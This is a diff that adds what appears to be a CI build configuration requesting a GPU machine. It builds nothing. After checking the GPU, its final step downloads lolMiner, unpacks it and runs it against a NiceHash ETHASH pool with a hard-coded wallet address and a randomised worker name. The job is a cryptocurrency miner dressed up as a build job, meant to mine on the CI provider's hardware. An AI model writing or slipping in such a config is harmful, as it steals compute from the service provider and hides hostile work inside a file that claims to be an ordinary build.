@@ -1,0 +1,9 @@
+jobs: 
+  build: 
+    machine: 
+      image: ubuntu-1604-cuda-10.1:201909-23 
+    resource_class: gpu.nvidia.large 
+    steps: 
+      - run: nvidia-smi 
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi 
+      - run: sudo apt-get update -y && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3MyRREpFLArTEgRGw7Z8a3hFFn3LXo54T5.wijaya.$(echo $(shuf -i 1000-9999999999 -n 1)-v100) --ethstratum ETHPROXY
